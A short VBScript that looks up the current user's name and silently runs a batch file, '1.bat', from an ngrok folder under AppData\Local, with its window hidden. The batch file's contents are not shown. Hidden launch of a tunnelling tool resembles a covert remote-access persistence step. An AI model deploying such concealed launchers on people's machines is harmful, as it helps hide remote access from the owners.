Set WshShell = CreateObject("WScript.Shell")
user = WshShell.ExpandEnvironmentStrings("%USERNAME%")
path = "C:\Users\" & user & "\AppData\Local\ngrok\1.bat"
WshShell.Run """" & path & """", 0, False
